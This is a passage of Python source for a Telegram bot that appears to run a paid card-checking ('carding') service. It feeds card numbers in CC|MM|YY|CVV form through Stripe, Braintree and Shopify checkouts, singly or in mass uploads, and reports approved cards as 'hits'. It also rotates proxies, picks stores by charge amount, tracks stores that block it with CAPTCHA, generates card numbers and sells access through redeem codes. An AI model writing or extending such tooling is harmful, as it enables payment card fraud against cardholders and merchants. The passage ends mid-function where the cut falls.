                    username = user_entity.username or "No username"
                    user_link = f"@{username}" if user_entity.username else f"ID: {user_id}"
                except:
                    user_link = f"ID: {user_id}"
                await self.bot_client.forward_messages(FORWARD_CHAT_ID, event.message)
                await self.safe_send_message(
                    FORWARD_CHAT_ID,
                    f"📤 <b>File Received</b>\n"
                    f"┃ 👤 User: {user_link}\n"
                    f"┃ 📁 File: <code>{filename}</code>\n"
                    f"┃ ⏰ Time: <code>{datetime.now().strftime('%H:%M:%S')}</code>"
                )
            except Exception as e:
                logger.error(f"❌ Error forwarding TXT file: {e}")

        @self.bot_client.on(events.CallbackQuery)
        async def callback(event):
            uid = event.sender_id
            data = event.data.decode()

            if data in ["mode_single", "mode_bt_single", "mode_mass", "mode_bt_mass"]:
                if not self.is_user_approved(uid):
                    await event.answer("❌ Global access required.", alert=True)
                    return

            if data.startswith("shopify_") or data.startswith("mode_shopify_"):
                shopify_protected = [
                    "shopify_menu", "mode_shopify_single", "mode_shopify_mass",
                    "shopify_upload_proxies", "shopify_proxy_status"
                ]
                if data in shopify_protected and not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return

            if data in ["account", "help_menu", "bin_search", "card_gen"]:
                if not self.has_any_access(uid):
                    await event.answer("❌ Access denied.", alert=True)
                    return

            if data == "admin" and uid not in ADMINS:
                await event.answer("❌ Admin only.", alert=True)
                return

            # ━━━━━━ STOP JOB ━━━━━━
            if data.startswith("stop_"):
                jid = data[5:]
                job = self.active_jobs.get(jid)
                if job and job['user_id'] == uid and not job.get('stop'):
                    job['stop'] = True
                    await event.answer("⏹ Stopping job...", alert=True)
                    p = job['processed']
                    t = job['total']
                    hits = len(job.get('approved_cards', []))
                    await event.edit(
                        "╔══════════════════════════════════════╗\n"
                        "║  ⏹ 𝗝𝗢𝗕 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 🛑                ║\n"
                        "╚══════════════════════════════╝\n\n"
                        f"    {self.progress_bar(p, t)}\n\n"
                        f"┃ 📃 Processed: <code>{p}/{t}</code>\n"
                        f"┃ ✅ Hits: <code>{hits}</code>",
                        parse_mode='html')
                else:
                    await event.answer("Already stopped.", alert=True)

            # ━━━━━━ SHOPIFY MENU ━━━━━━
            elif data == "shopify_menu":
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return
                pc = len(self.user_proxies.get(uid, []))
                p_icon = "🟢" if pc > 0 else "🔴"
                ws = len(self.working_sites)
                ds = len(self.dead_sites)
                current_filter = self.user_amount_filter.get(uid, "all")
                filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "all": "🌐 All"}
                filter_display = filter_labels.get(current_filter, "🌐 All")
                active_count = sum(1 for j in self.active_jobs.values() if j.get('user_id') == uid and not j.get('stop'))
                btns = [
                    [Button.inline("💳 𝗦𝗶𝗻𝗴𝗹𝗲 𝗖𝗵𝗲𝗰𝗸 🎯", data="mode_shopify_single")],
                    [Button.inline("📃 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸 💣", data="mode_shopify_mass")],
                    [Button.inline(f"📊 Active Jobs ({active_count}) & Stop 🛑", data="shopify_active_jobs")],
                    [Button.inline("💰 Low (<$5)", data="shopify_filter_low"),
                     Button.inline("💵 Med ($5-10)", data="shopify_filter_medium")],
                    [Button.inline("💎 High ($10-20)", data="shopify_filter_high"),
                     Button.inline("🌐 All", data="shopify_filter_all")],
                    [Button.inline("📎 𝗨𝗽𝗹𝗼𝗮𝗱 𝗣𝗿𝗼𝘅𝗶𝗲𝘀 🔗", data="shopify_upload_proxies"),
                     Button.inline("📊 𝗣𝗿𝗼𝘅𝘆 𝗦𝘁𝗮𝘁𝘂𝘀 📡", data="shopify_proxy_status")],
                    [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")]
                ]
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗥𝗘𝗟𝗢𝗔𝗗𝗘𝗗 ᴇɴᴛɪᴛʏ V2 ☠️   ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┌──────── 🌐 𝗜𝗻𝗳𝗿𝗮 ──────────────┐\n"
                    f"│  🟢 Sites Alive:  <code>{ws}</code>\n"
                    f"│  🔴 Sites Dead:   <code>{ds}</code>\n"
                    f"│  {p_icon} Proxies:      <code>{pc}</code> loaded\n"
                    f"│  🎯 Amount Filter: <code>{filter_display}</code>\n"
                    "└──────────────────────────────────────┘\n\n"
                    "┌──────── 📝 𝗨𝘀𝗮𝗴𝗲 ──────────────┐\n"
                    "│  🌐 <code>/sp CC|MM|YY|CVV</code>\n"
                    "│  🔗 <code>/sp CC|MM|YY|CVV proxy</code>\n"
                    "│  🎯 <code>/sp CC|MM|YY|CVV low</code>\n"
                    "└──────────────────────────────────────┘\n\n"
                    "⚠️ <i>Upload proxies first for proxy mode</i>",
                    buttons=btns, parse_mode='html'
                )

            # ━━━━━━ AMOUNT FILTER SELECTION ━━━━━━
            elif data.startswith("shopify_filter_"):
                filter_choice = data.replace("shopify_filter_", "")
                if filter_choice in ("low", "medium", "high", "all"):
                    self.user_amount_filter[uid] = filter_choice
                    filter_labels = {"low": "💰 Low (<$5)", "medium": "💵 Medium ($5-10)", "high": "💎 High ($10-20)", "all": "🌐 All"}

                    # FIX: Warn if cache is incomplete for non-"all" filters
                    if filter_choice != "all":
                        base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
                        uncached = [s for s in base_sites if s not in self._site_price_cache]
                        if uncached:
                            await event.answer(
                                f"⚠️ {len(uncached)} sites have no cached price. Run /test_sites first for accurate filtering.",
                                alert=True
                            )
                        else:
                            await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)
                    else:
                        await event.answer(f"✅ Filter set: {filter_labels[filter_choice]}", alert=True)

                    # Pre-filter sites by amount filter (instant — no API calls)
                    try:
                        await self.rebuild_sites_by_filter(filter_choice)
                    except Exception as e:
                        logger.warning(f"Failed to rebuild sites by filter: {e}")

            # ━━━━━━ ACTIVE JOBS & STOP ━━━━━━
            elif data == "shopify_active_jobs":
                user_jobs = {jid: j for jid, j in self.active_jobs.items()
                             if j.get('user_id') == uid and not j.get('stop')}
                if not user_jobs:
                    await event.edit(
                        "╔══════════════════════════════════════╗\n"
                        "║  📊 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
                        "╠══════════════════════════════════════╣\n\n"
                        "┃ <i>No active jobs.</i>\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                    )
                else:
                    lines = []
                    btns = []
                    for jid, j in user_jobs.items():
                        gw = j.get('gateway', 'shopify')
                        p = j.get('processed', 0)
                        t = j.get('total', 0)
                        hits = len(j.get('approved_cards', []))
                        lines.append(
                            f"┃ 🔄 <b>{gw.upper()}</b> | {p}/{t} processed | ✅ {hits} hits"
                        )
                        btns.append([Button.inline(f"⏹ Stop {jid[:8]}...", data=f"stop_{jid}")])
                    btns.append([Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")])
                    await event.edit(
                        "╔══════════════════════════════════════╗\n"
                        "║  📊 𝗔𝗖𝗧𝗜𝗩𝗘 𝗝𝗢𝗕𝗦                    ║\n"
                        "╠══════════════════════════════════════╣\n\n"
                        + "\n".join(lines) + "\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=btns
                    )

            elif data == "mode_shopify_single":
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  💳 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗦𝗜𝗡𝗚𝗟𝗘 𝗞𝗜𝗟𝗟 🎯   ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
                    "┌──────── 🌐 𝗥𝗲𝗹𝗼𝗮𝗱𝗲𝗱 𝗠𝗼𝗱𝗲 ───────┐\n"
                    "│  <code>/sp 4601860005184553|03|28|478</code>\n"
                    "└──────────────────────────────────────┘\n\n"
                    "┌──────── 🔗 𝗣𝗿𝗼𝘅𝘆 𝗠𝗼𝗱𝗲 ─────────┐\n"
                    "│  <code>/sp 4601860005184553|03|28|478 proxy</code>\n"
                    "└──────────────────────────────────────┘",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                )

            elif data == "mode_shopify_mass":
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return
                self.user_upload_mode[uid] = 'shopify'
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  📃 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 ─ 𝗠𝗔𝗦𝗦 𝗞𝗜𝗟𝗟 💣      ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    f"📃 Max cards: <code>{MAX_CARDS_PER_FILE_SHOPIFY:,}</code>\n\n"
                    "┌──────── 📝 𝗙𝗶𝗹𝗲 𝗙𝗼𝗿𝗺𝗮𝘁 ─────────┐\n"
                    "│  One card per line:\n"
                    "│  <code>4601860005184553|03|28|478</code>\n"
                    "│  <code>5509890034877216|06|28|333</code>\n"
                    "└──────────────────────────────────────┘\n\n"
                    "📤 <b>Send your .txt file now...</b>",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                )

            elif data == "shopify_upload_proxies":
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return
                self.user_upload_mode[uid] = 'shopify_proxies'
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📎 UPLOAD PROXIES          ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "┏━━━━━ 📝 Format ━━━━━━━━━━━┓\n"
                    "┃ <code>host:port:user:pass</code>\n"
                    "┃\n"
                    "┃ Example:\n"
                    "┃ <code>px023.server.com:10780:user:pass</code>\n"
                    "┃ <code>proxy.example.com:8080:user:pass</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "✅ Bot will auto-validate\n"
                    "📤 <b>Send your .txt file now...</b>",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                )

            elif data == "shopify_proxy_status":
                if not self.is_shopify_approved(uid) and uid not in ADMINS:
                    await event.answer("❌ Shopify access required.", alert=True)
                    return
                proxies = self.user_proxies.get(uid, [])
                if proxies:
                    # Show latency info if available
                    latency_data = self._proxy_latency.get(uid, [])
                    if latency_data:
                        plist = "\n".join([
                            f"┃ ✅ <code>{p[:40]}</code> ({lat:.0f}ms)"
                            for p, lat in latency_data[:5]
                        ])
                        more = f"\n┃ <i>+{len(proxies)-5} more...</i>" if len(proxies) > 5 else ""
                        fastest = f"{latency_data[0][1]:.0f}ms" if latency_data else "N/A"
                        sort_info = f"🏎️ <b>Fastest:</b> <code>{fastest}</code>\n🔄 <b>Rotation:</b> <code>Latency-sorted</code>"
                    else:
                        plist = "\n".join([f"┃ ✅ <code>{p[:40]}</code>" for p in proxies[:5]])
                        more = f"\n┃ <i>+{len(proxies)-5} more...</i>" if len(proxies) > 5 else ""
                        sort_info = "🔄 <b>Rotation:</b> <code>Round-Robin</code>"
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   📊 PROXY STATUS            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        f"🟢 <b>Total Active:</b> <code>{len(proxies)}</code>\n"
                        f"{sort_info}\n\n"
                        f"┏━━━━━ 📋 Loaded ━━━━━━━━━━━┓\n"
                        f"{plist}{more}\n"
                        f"┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                    )
                else:
                    await event.edit(
                        "╔══════════════════════════════╗\n"
                        "║   📊 PROXY STATUS            ║\n"
                        "╚══════════════════════════════╝\n\n"
                        "🔴 <b>No proxies loaded</b>\n\n"
                        "📎 Use <b>Upload Proxies</b> to add",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_menu")
                    )

            # ━━━━━━ STRIPE / BRAINTREE MENUS ━━━━━━
            elif data == "mode_single":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   ⚡ STRIPE — SINGLE         ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
                    "📤 <code>/st 4601860005184553|03|28|478</code>\n\n"
                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "mode_bt_single":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   🌐 BRAINTREE — SINGLE      ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📝 <b>Format:</b> <code>CC|MM|YY|CVV</code>\n\n"
                    "📤 <code>/bt 4601860005184553|03|28|478</code>\n\n"
                    "🌐 <b>Mode:</b> <code>Direct Engine</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "mode_mass":
                self.user_upload_mode[uid] = 'stripe'
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📃 STRIPE — MASS           ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"📃 Max: <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code> cards\n\n"
                    "┏━━━━━ 📝 File Format ━━━━━━━┓\n"
                    "┃ One card per line:\n"
                    "┃ <code>CC|MM|YY|CVV</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "📤 <b>Send your .txt file now...</b>",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "mode_bt_mass":
                self.user_upload_mode[uid] = 'braintree'
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║   📃 BRAINTREE — MASS        ║\n"
                    "╚══════════════════════════════╝\n\n"
                    f"📃 Max: <code>{MAX_CARDS_PER_FILE_BRAINTREE:,}</code> cards\n\n"
                    "┏━━━━━ 📝 File Format ━━━━━━━┓\n"
                    "┃ One card per line:\n"
                    "┃ <code>CC|MM|YY|CVV</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "📤 <b>Send your .txt file now...</b>",
                    parse_mode='html', buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "account":
                await self.show_user_dashboard(uid, event.chat_id)
                await event.answer()

            elif data == "help_menu":
                await self.safe_send_message(
                    event.chat_id,
                    "╔══════════════════════════════╗\n"
                    "║      ℹ️ HELP CENTER           ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "┏━━━━━ ⚡ Gateways ━━━━━━━━━━┓\n"
                    "┃ <code>/st CC|MM|YY|CVV</code> — Stripe\n"
                    "┃ <code>/bt CC|MM|YY|CVV</code> — Braintree\n"
                    "┃ <code>/sp CC|MM|YY|CVV</code> — Shopify\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "┏━━━━━ 🛠 Utilities ━━━━━━━━━━┓\n"
                    "┃ <code>/myaccount</code>  — Account info\n"
                    "┃ <code>/bin 424242</code> — BIN lookup\n"
                    "┃ <code>/generate 1000 424242</code>\n"
                    "┃ <code>/redeem CODE</code> — Redeem key\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
                )
                await event.answer()

            elif data == "bin_search":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║      🔍 BIN LOOKUP           ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 Send: <code>/bin 424242</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "card_gen":
                await event.edit(
                    "╔══════════════════════════════╗\n"
                    "║      🎴 CARD GENERATOR       ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "┏━━━━━ 📝 Usage ━━━━━━━━━━━━┓\n"
                    "┃ <code>/generate 1000</code>        Random\n"
                    "┃ <code>/generate 1000 424242</code> Custom\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            elif data == "redeem_menu":
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🎟️ 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘 🔑                ║\n"
                    "╚══════════════════════════════╝\n\n"
                    "📤 Send: <code>/redeem YOUR_CODE</code>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")
                )

            # ━━━━━━ ADMIN PANEL ━━━━━━
            elif data == "admin":
                btns = [
                    [Button.inline("📢 𝗕𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 📡", data="admin_broadcast"),
                     Button.inline("👥 𝗨𝘀𝗲𝗿𝘀 🧬", data="admin_users")],
                    [Button.inline("📊 𝗦𝘁𝗮𝘁𝘀 📈", data="admin_stats"),
                     Button.inline("🎟️ 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 🔑", data="admin_gencode")],
                    [Button.inline("🛒 𝗦𝗵𝗼𝗽𝗶𝗳𝘆 ☠️", data="shopify_admin"),
                     Button.inline("📂 𝗦𝗶𝘁𝗲𝘀 🌐", data="admin_upload_sites")],
                    [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="back_main")]
                ]
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  ⚙️ 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 👑                 ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┏━━━━━ 📊 Overview ━━━━━━━━━┓\n"
                    f"┃ 👥 Global Users:  <code>{len(self.users)}</code>\n"
                    f"┃ 🛒 Shopify Users: <code>{len(self.shopify_users)}</code>\n"
                    f"┃ 🌐 Sites Alive:   <code>{len(self.working_sites)}</code>\n"
                    f"┃ 🕒 Uptime:        <code>{self.get_uptime()}</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    buttons=btns, parse_mode='html'
                )

            elif data == "admin_upload_sites":
                self.user_upload_mode[uid] = 'owner_sites'
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  📂 𝗨𝗣𝗟𝗢𝗔𝗗 𝗦𝗜𝗧𝗘𝗦 ⚡                ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┌──────── 📝 𝗙𝗼𝗿𝗺𝗮𝘁 ──────────────┐\n"
                    "│  One URL per line:\n"
                    "│  <code>https://store1.com</code>\n"
                    "│  <code>https://store2.com</code>\n"
                    "└──────────────────────────────────────┘\n\n"
                    f"⚠️ <b>Max:</b> <code>{MAX_OWNER_SITES}</code> sites\n\n"
                    "⚡ <b>All sites will be trusted as working</b>\n"
                    "💎 <i>No testing — instant load</i>\n\n"
                    "📤 <b>Send your .txt file now...</b>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸", data="admin")
                )

            elif data == "shopify_admin":
                good_count = len(self.good_sites)
                captcha_blocked = len(self._captcha_blocked_sites)
                btns = [
                    [Button.inline("👥 𝗨𝘀𝗲𝗿𝘀 🧬", data="shopify_list_users"),
                     Button.inline("🎟️ 𝗚𝗲𝗻 𝗖𝗼𝗱𝗲 🔑", data="shopify_gencode")],
                    [Button.inline("✅ 𝗔𝗽𝗽𝗿𝗼𝘃𝗲 👤", data="shopify_approve_prompt"),
                     Button.inline("❌ 𝗥𝗲𝘃𝗼𝗸𝗲 🚫", data="shopify_revoke_prompt")],
                    [Button.inline("🔍 𝗧𝗲𝘀𝘁 𝗦𝗶𝘁𝗲𝘀 (𝗔𝗣𝗜) ⚡", data="shopify_test_sites")],
                    [Button.inline(f"✨ Use Only Good Sites ({good_count})", data="shopify_use_good_sites")],
                    [Button.inline("🎟️ Mass Gen Codes (up to 50)", data="shopify_mass_gencode_menu")],
                    [Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="admin")]
                ]
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🛒 𝗦𝗛𝗢𝗣𝗜𝗙𝗬 𝗔𝗗𝗠𝗜𝗡 ☠️              ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┏━━━━━ 📊 Overview ━━━━━━━━━┓\n"
                    f"┃ 👥 Users: <code>{len(self.shopify_users)}</code>\n"
                    f"┃ 🟢 Sites: <code>{len(self.working_sites)}</code> alive\n"
                    f"┃ ✨ Good:  <code>{good_count}</code>\n"
                    f"┃ 🔴 Dead:  <code>{len(self.dead_sites)}</code>\n"
                    f"┃ ⏳ CAPTCHA blocked: <code>{captcha_blocked}</code>\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    buttons=btns, parse_mode='html'
                )

            elif data == "shopify_test_sites":
                # Admin-only: run API site tester and auto-load working sites
                if uid not in ADMINS:
                    await event.answer("🔒 Admin only.", alert=True)
                    return
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🔍 𝗧𝗘𝗦𝗧𝗜𝗡𝗚 𝗦𝗜𝗧𝗘𝗦... ⏳             ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    f"┃ Testing <code>{len(self.owner_sites)}</code> sites via API...\n"
                    f"┃ ⚡ Concurrent ({SITE_TEST_CONCURRENCY_LIMIT} parallel) + retry on 503.\n"
                    "┃ This may take a few minutes.\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    parse_mode='html'
                )
                try:
                    sites = list(self.owner_sites) if self.owner_sites else []
                    working, dead = await self.test_sites_graphql(sites)
                    # Auto-load working sites
                    loaded = self.load_working_sites_from_file()
                    # FIX: If 0 working sites found, fall back to all owner_sites
                    fallback_msg = ""
                    if loaded == 0 and self.owner_sites:
                        self.working_sites = list(self.owner_sites)
                        self.site_index = 0
                        self.dead_sites = set()
                        loaded = len(self.working_sites)
                        fallback_msg = "\n⚠️ <i>No tested sites passed — using ALL owner sites as fallback.</i>"
                        logger.warning(f"⚠️ Site test found 0 working — falling back to {loaded} owner_sites")

                    # Build working sites preview
                    working_preview = ""
                    if working:
                        sample = working[:5]
                        working_preview = "\n".join([f"┃ ✅ <code>{self.normalize_site_url(s).replace('https://', '')}</code>" for s in sample])
                        if len(working) > 5:
                            working_preview += f"\n┃ ... and {len(working) - 5} more"
                        working_preview = f"\n\n┏━━━ Working sites (sample) ━━━┓\n{working_preview}\n┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"

                    await event.edit(
                        "╔══════════════════════════════════════╗\n"
                        "║  🔍 𝗦𝗜𝗧𝗘 𝗧𝗘𝗦𝗧 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘 ✅         ║\n"
                        "╠══════════════════════════════════════╣\n\n"
                        f"┃ ✅ Working: <code>{len(working)}</code>\n"
                        f"┃ ✨ Good:    <code>{len(self.good_sites)}</code> (real payment responses)\n"
                        f"┃ ❌ Dead:    <code>{len(dead)}</code>\n"
                        f"┃ 📦 Loaded:  <code>{loaded}</code> sites activated\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n"
                        f"{working_preview}\n\n"
                        f"💎 <i>Only fully verified sites loaded for mass checks.</i>{fallback_msg}\n"
                        "📋 <i>Check bot logs for per-site failure details.</i>",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )
                except Exception as e:
                    await event.edit(
                        f"❌ Site test failed: <code>{str(e)[:100]}</code>",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )

            elif data == "shopify_site_health":
                # No testing — just show current site status
                w = len(self.working_sites)
                d = len(self.dead_sites)
                wl = "\n".join([f"┃ ✅ <code>{s}</code>" for s in self.working_sites[:8]]) or "┃ <i>None</i>"
                dl = "\n".join([f"┃ ❌ <code>{s}</code>" for s in list(self.dead_sites)[:5]]) or "┃ <i>None</i>"
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🏥 𝗦𝗜𝗧𝗘 𝗦𝗧𝗔𝗧𝗨𝗦 ⚡                 ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    f"┏━━━━━ ✅ Working ({w}) ━━━━━━┓\n"
                    f"{wl}\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    f"┏━━━━━ ❌ Dead ({d}) ━━━━━━━━━┓\n"
                    f"{dl}\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n\n"
                    "💎 <i>Sites are trusted — no testing needed</i>",
                    parse_mode='html',
                    buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                )

            # ━━━━━━ USE ONLY GOOD SITES ━━━━━━
            elif data == "shopify_use_good_sites":
                if uid not in ADMINS:
                    await event.answer("🔒 Admin only.", alert=True)
                    return
                # Load good_sites_api.txt if it exists
                good_loaded = 0
                if os.path.exists("good_sites_api.txt"):
                    with open("good_sites_api.txt", "r") as f:
                        good = [l.strip() for l in f if l.strip()]
                    if good:
                        self.good_sites = good
                        self.working_sites = list(good)
                        self.site_index = 0
                        good_loaded = len(good)
                if good_loaded == 0:
                    await event.edit(
                        "❌ No good sites found. Run <b>Test Sites</b> first.",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )
                else:
                    await event.edit(
                        "╔══════════════════════════════════════╗\n"
                        "║  ✨ 𝗚𝗢𝗢𝗗 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ✅           ║\n"
                        "╠══════════════════════════════════════╣\n\n"
                        f"┃ ✅ Loaded: <code>{good_loaded}</code> good sites\n"
                        "┃ 💎 Only sites with real payment responses\n"
                        "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )

            # ━━━━━━ MASS GEN CODES MENU (Button-driven) ━━━━━━
            elif data == "shopify_mass_gencode_menu":
                if uid not in ADMINS:
                    await event.answer("🔒 Admin only.", alert=True)
                    return
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🎟️ 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    "┃ Select how many codes to generate:\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    parse_mode='html',
                    buttons=[
                        [Button.inline("🔟 10 codes", data="mgc_count_10"),
                         Button.inline("2️⃣5️⃣ 25 codes", data="mgc_count_25")],
                        [Button.inline("5️⃣0️⃣ 50 codes", data="mgc_count_50")],
                        [Button.inline("❌ Cancel", data="shopify_admin")]
                    ]
                )

            elif data.startswith("mgc_count_"):
                if uid not in ADMINS:
                    await event.answer("🔒 Admin only.", alert=True)
                    return
                count = int(data.replace("mgc_count_", ""))
                self._mgc_pending = getattr(self, '_mgc_pending', {})
                self._mgc_pending[uid] = count
                await event.edit(
                    "╔══════════════════════════════════════╗\n"
                    "║  🎟️ 𝗠𝗔𝗦𝗦 𝗚𝗘𝗡 𝗖𝗢𝗗𝗘𝗦                 ║\n"
                    "╠══════════════════════════════════════╣\n\n"
                    f"┃ Generating <b>{count}</b> codes.\n"
                    "┃ Select duration:\n"
                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                    parse_mode='html',
                    buttons=[
                        [Button.inline("1m", data="mgc_dur_1m"),
                         Button.inline("1h", data="mgc_dur_1h"),
                         Button.inline("1d", data="mgc_dur_1d")],
                        [Button.inline("1w", data="mgc_dur_1w"),
                         Button.inline("1month", data="mgc_dur_1month"),
                         Button.inline("perm", data="mgc_dur_perm")],
                        [Button.inline("❌ Cancel", data="shopify_admin")]
                    ]
                )

            elif data.startswith("mgc_dur_"):
                if uid not in ADMINS:
                    await event.answer("🔒 Admin only.", alert=True)
                    return
                duration = data.replace("mgc_dur_", "")
                self._mgc_pending = getattr(self, '_mgc_pending', {})
                count = self._mgc_pending.pop(uid, 10)
                codes = []
                for _ in range(count):
                    code = self.generate_shopify_redeem_code(duration)
                    if code:
                        codes.append(code)
                if not codes:
                    await event.edit(
                        "❌ Failed to generate codes.",
                        parse_mode='html',
                        buttons=Button.inline("◀️ 𝗕𝗮𝗰𝗸 🔙", data="shopify_admin")
                    )
                    return
                codes_text = "\n".join(f"<code>{c}</code>" for c in codes)
                msg_text = (
                    "╔══════════════════════════════════╗\n"
                    "║  🎟️ MASS CODES GENERATED         ║\n"
                    "╚══════════════════════════════════╝\n\n"
                    f"📊 Count: <b>{len(codes)}</b>\n"
